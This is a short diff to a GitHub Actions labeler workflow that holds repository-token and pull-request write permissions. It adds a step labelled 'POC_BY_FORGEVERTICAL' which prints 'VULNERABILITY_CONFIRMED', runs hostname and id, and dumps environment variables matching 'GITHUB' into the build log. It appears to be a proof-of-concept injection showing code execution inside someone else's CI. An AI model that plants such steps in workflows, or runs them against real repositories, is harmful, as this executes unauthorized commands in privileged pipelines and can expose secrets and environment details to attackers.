@@ -9,6 +9,12 @@ jobs:
       pull-requests: write
     runs-on: ubuntu-latest
     steps:
+      - name: "POC_BY_FORGEVERTICAL"
+        run: |
+          echo "VULNERABILITY_CONFIRMED"
+          hostname
+          id
+          env | grep -i "GITHUB"
       - uses: actions/labeler@v6
         with:
           repo-token: "${{ secrets.GITHUB_TOKEN }}"
